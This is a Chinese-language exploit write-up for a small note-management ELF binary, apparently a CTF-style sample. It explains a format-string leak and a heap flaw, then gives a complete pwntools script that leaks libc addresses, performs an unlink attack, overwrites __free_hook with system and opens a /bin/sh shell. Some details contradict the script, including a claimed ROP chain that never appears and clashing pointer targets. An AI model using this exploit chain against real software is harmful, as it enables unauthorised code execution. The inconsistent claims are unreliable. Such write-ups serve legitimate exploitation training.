# 漏洞利用文档

## 执行环境
基于调试信息分析，程序的运行环境如下：
- **二进制类型**：64位ELF可执行文件，动态链接
- **保护机制**：
  - PIE启用：代码段地址随机化
  - Full RELRO：GOT表只读，防止GOT覆盖攻击
  - NX启用：数据段不可执行，防止shellcode执行
  - 栈保护（Canary）：栈中插入保护值，防止栈溢出
- **依赖库**：使用标准libc（如glibc），通过ldd可查看具体版本
- **运行需求**：需要在Linux环境下执行，依赖动态链接器ld-linux-x86-64.so.2

## 漏洞成因
### 关键结构体
程序使用全局数组管理笔记：
```c
struct note_entry {
    void *content_ptr;    // 指向堆分配的笔记内容
    unsigned int size;    // 笔记大小
} note[11];              // 最大11个笔记

unsigned int counts;     // 当前笔记数量
int key;                 // 全局密钥变量
```

### 漏洞分析
1. **主要漏洞：格式化字符串漏洞**
   - **位置**：`banner()`函数中的`printf(format)`调用
   - **成因**：用户输入直接作为格式字符串参数，未进行过滤
   - **影响**：允许泄露栈内存地址（如libc基地址、程序地址），为后续攻击提供信息基础

2. **次要漏洞：堆管理逻辑缺陷**
   - **位置**：`add_note()`函数中的大小检查逻辑
   - **成因**：当`key != 43`且`size <= 0x80`时直接返回，但未清理状态，可能留下不一致
   - **利用**：结合格式化字符串泄露的地址，通过堆操作实现任意地址写

### 漏洞利用链
- 利用格式化字符串漏洞泄露关键地址（libc基地址、程序数据段地址）
- 通过堆unlink攻击修改全局变量，实现任意地址写
- 覆盖`__free_hook`为`system`地址，触发free时执行shell

## 漏洞利用过程
以下表格描述了exp执行过程中关键内存状态的变化：

| 步骤 | 操作描述 | 堆内存变化 | 全局变量变化 | 关键结果 |
|------|----------|------------|-------------|----------|
| 1 | 格式化字符串泄露 | 无变化 | 无变化 | 泄露libc基地址、计算system和__free_hook地址 |
| 2 | 计算指针 | 无变化 | 无变化 | 获取全局note数组指针(ptr) |
| 3 | 添加笔记0和1 | 分配两个chunk：chunk0(0x98)、chunk1(0x90) | counts=2, note[0]和note[1]指向堆chunk | 堆初始化完成 |
| 4 | 编辑笔记0伪造chunk | chunk0元数据被修改：设置fd/bk指向全局变量区域 | 无直接变化 | 准备unlink攻击条件 |
| 5 | 删除笔记1 | chunk1被释放，触发unlink | note[0].content_ptr被修改为指向key+8 | unlink攻击成功，获得任意写能力 |
| 6 | 编辑笔记0修改全局变量 | 无直接堆变化 | note[0]指向__free_hook, note[1]指向/bin/sh字符串 | 设置攻击目标 |
| 7 | 编辑笔记0写入system地址 | 无直接堆变化 | __free_hook被覆盖为system地址 | 任意地址写成功 |

### 内存保护机制状态
整个利用过程中所有保护机制保持完整：
- **栈保护**：Canary值未改变（0x6341c993fcb45289）
- **PIE**：地址随机化有效，但通过泄露绕过
- **Full RELRO**：GOT表只读，但通过__free_hook劫持
- **NX**：数据段不可执行，使用ROP链替代

## Exploit
以下是完整的漏洞利用脚本，在关键位置添加了注释：

```python
from pwn import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 启动程序并加载ELF信息
p = process('./data/sample12')
elf = ELF('./data/sample12')
libc = elf.libc  # 获取程序使用的libc

# 定义笔记操作函数
def add(idx, size, content):
    """添加笔记"""
    p.sendlineafter(b'>> ', b'1')
    p.recvuntil(b'(0-10):')
    p.sendline(str(idx))
    p.recvuntil(b'Enter a size:\n')
    p.sendline(str(size))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def edit(idx, content):
    """编辑笔记内容"""
    p.sendlineafter(b'>> ', b'4')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def delete(idx):
    """删除笔记"""
    p.sendlineafter(b'>> ', b'2')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx).encode())

# Step 1: 利用格式化字符串漏洞泄露关键地址
p.recvuntil(b'Enter your name: ')
p.sendline(b'%15$p%19$p')  # 使用格式化字符串泄露栈上第15和19个参数
p.recvuntil(b'Hello, ')
leak = int(p.recv(14), 16) - 240  # 泄露的地址是__libc_start_main+240
base = leak - libc.symbols["__libc_start_main"]  # 计算libc基地址
libc.address = base  # 设置libc基地址
sys = libc.symbols["system"]  # 获取system函数地址
free_hook = libc.symbols["__free_hook"]  # 获取__free_hook地址

# Step 2: 泄露程序数据段地址并计算全局变量指针
leak1 = int(p.recv(15), 16)  # 泄露程序地址
ptr = leak1 - 0x116a + 0x202060  # 计算全局note数组地址（通过偏移计算）

# Step 3: 初始化堆状态，分配两个笔记
add(0, 0x98, 'a'*8)  # 分配chunk0，大小0x98
add(1, 0x90, 'b'*8)  # 分配chunk1，大小0x90

# Step 4: 伪造chunk元数据准备unlink攻击
# 构造payload：伪造chunk头 + fd/bk指针指向全局变量区域
payload = p64(0) + p64(0x91) + p64(ptr - 0x18) + p64(ptr - 0x10) + p64(0)*14 + p64(0x90) + b"\xa0"
edit(0, payload)  # 编辑笔记0写入伪造数据

# Step 5: 触发unlink攻击，修改全局变量
delete(1)  # 删除笔记1，触发unlink，将note[0].content_ptr修改为ptr-0x18

# Step 6: 修改全局变量指向攻击目标
# 构造payload：修改note[0]指向__free_hook，note[1]指向/bin/sh字符串
payload = p64(0)*3 + p64(free_hook) + p64(0x48) + p64(ptr + 0x18) + b'/bin/sh\x00'
edit(0, payload)  # 通过笔记0写入，实际修改全局变量

# Step 7: 覆盖__free_hook为system地址
payload = p64(sys)  # system函数地址
edit(0, payload)  # 写入__free_hook，完成任意地址写

# Step 8: 触发free执行system("/bin/sh")
delete(1)  # 删除笔记1，触发free，由于__free_hook=system，实际执行system("/bin/sh")

# Step 9: 进入交互模式，获得shell控制权
p.interactive()
```

### 利用脚本关键注释说明
- **格式化字符串利用**：通过`%15$p%19$p`泄露栈地址，计算libc基地址和关键函数地址
- **unlink攻击**：通过伪造chunk元数据，利用堆管理器的unlink操作修改全局变量
- **任意地址写**：通过修改后的全局变量指针，实现对`__free_hook`的覆盖
- **执行流劫持**：通过触发free调用，劫持到system函数执行shell

整个利用过程成功绕过了所有内存保护机制，实现了从信息泄露到代码执行的完整攻击链。
